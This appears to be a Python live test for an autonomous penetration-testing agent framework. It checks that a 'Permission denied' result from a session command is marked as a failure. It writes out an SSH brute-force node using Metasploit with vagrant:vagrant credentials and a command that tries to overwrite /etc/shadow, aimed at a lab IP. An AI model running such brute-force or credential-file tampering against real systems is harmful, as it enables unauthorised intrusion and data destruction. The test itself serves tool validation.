"""
Focused live test for Fix 1 — command failure detection.

Builds a minimal 2-node graph that deterministically exercises the
session-command path that Fix 1 changed:

  recon-skipped   (we hand-build findings)
       │
       ▼
  ssh_bruteforce  (vagrant:vagrant — gets session)
       │ on_success
       ▼
  perm_denied     (session command "echo X > /etc/shadow" — guaranteed
                   Permission denied as vagrant)

Before Fix 1: the perm_denied node would be marked SUCCESS even though
every command returned "Permission denied".

After Fix 1: should be marked FAILED with a summary that names the
detected failure phrase.

Pass criteria (inspected from the log):
  - perm_denied status → FAILED (not SUCCESS).
  - At least one "[direct] Command failed ('permission denied'):" log line.
  - perm_denied's summary contains "permission denied".
"""

from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from core_agents.attack_graph import AttackGraph, AttackNode, Tactic
from core_agents.orchestrator import run_graph

TARGET_IP = "192.168.34.7"
ATTACKER_IP = "192.168.34.6"


def build_graph() -> AttackGraph:
    g = AttackGraph.create(
        objective="Verify Fix 1 detects Permission denied on session commands.",
        target_ip=TARGET_IP,
        attacker_ip=ATTACKER_IP,
        name=f"fix1_focused_{TARGET_IP}",
    )

    g.add_node(AttackNode(
        id="ssh_bruteforce",
        label="SSH Credential Guessing",
        tactic=Tactic.CREDENTIAL_ACCESS.value,
        agent_type="exploit",
        goal="Open an SSH session",
        objective=f"Brute-force SSH on {TARGET_IP} with vagrant:vagrant.",
        target_ip=TARGET_IP,
        tool_name="metasploit",
        module="auxiliary/scanner/ssh/ssh_login",
        module_options={
            "RHOSTS": TARGET_IP,
            "RPORT": 22,
            "USERNAME": "vagrant",
            "PASSWORD": "vagrant",
            "STOP_ON_SUCCESS": "true",
            "BRUTEFORCE_SPEED": "5",
        },
        max_retries=2,
    ))

    g.add_node(AttackNode(
        id="perm_denied",
        label="Write to /etc/shadow (should be Permission denied)",
        tactic=Tactic.IMPACT.value,
        agent_type="impact",
        goal="Exercise Fix 1: session command that MUST be detected as failure",
        objective="Try to overwrite /etc/shadow as vagrant -- guaranteed denied.",
        target_ip=TARGET_IP,
        tool_name="session",
        commands_to_run=[
            "echo 'pwned' > /etc/shadow",
            "cat /etc/shadow_does_not_exist",
        ],
        max_retries=1,
    ))

    g.connect("ssh_bruteforce", "perm_denied", condition="on_success",
              rationale="Need session to run target commands")
    return g


if __name__ == "__main__":
    graph = build_graph()
    print(f"Loaded graph: {graph.name}")
    print(f"Running with explore=False, use_judge=False -- pure deterministic flow.")
    # explore=False keeps the replanner out so the test cleanly exercises
    # only the session-command failure-detection path.
    run_graph(graph, explore=False, use_judge=False)
